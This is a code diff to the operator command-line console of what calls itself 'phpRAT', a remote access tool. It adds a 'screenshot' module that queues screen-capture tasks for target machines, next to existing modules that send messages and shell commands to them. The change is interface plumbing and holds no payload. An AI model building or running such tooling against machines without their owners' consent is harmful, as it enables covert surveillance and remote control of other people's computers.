@@ -17,7 +17,7 @@ class CLI(cmd.Cmd):
     intro = 'Welcome to phpRAT, use ? to see the commands\n'
     prompt = '(phpRAT) '
     machine_id = None
-    modules = ['msg', 'cmd']
+    modules = ['msg', 'cmd', 'screenshot']
     message = None
     command = None
 
@@ -86,6 +86,10 @@ class CLI(cmd.Cmd):
                            ('command', str(self.command), 'True')]
                 print(tabulate(options, headers=[
                       "Option", "Value", "Required"]), end='\n\n')
+            elif curr_module == 'screenshot':
+                options = [('machine', str(self.machine_id), 'True')]
+                print(tabulate(options, headers=[
+                      "Option", "Value", "Required"]), end='\n\n')
         else:
             print("Use help!")
 
@@ -120,6 +124,8 @@ class CLI(cmd.Cmd):
             self.prompt = "(msg) "
         if 'cmd' in args:
             self.prompt = "(cmd) "
+        if 'screenshot' in args:
+            self.prompt = "(screenshot) "
 
     def do_execute(self, args):
         curr_module = self.get_curr_module()
@@ -137,7 +143,13 @@ class CLI(cmd.Cmd):
                 print(f"Added Task {task_id}")
             else:
                 print("Check Options!")
-
+        elif curr_module == 'screenshot':
+            if self.machine_id:
+                task_id = queue.insert(
+                    'screenshot', self.machine_id, args=[])
+                print(f"Added Task {task_id}")
+            else:
+                print("Check Options!")
     def complete_show(self, text, line, begidx, endidx):
         args_len = 2
         completions = ['machines', 'queue']
@@ -157,6 +169,8 @@ class CLI(cmd.Cmd):
             completions = ['machine', 'message']
         elif 'cmd' in self.get_curr_module():
             completions = ['machine', 'command']
+        elif 'screenshot' in self.get_curr_module():
+            completions = ['machine']
         if 'machine' in line:
             lock.acquire(True)
             db.c.execute('SELECT machineId FROM machines')
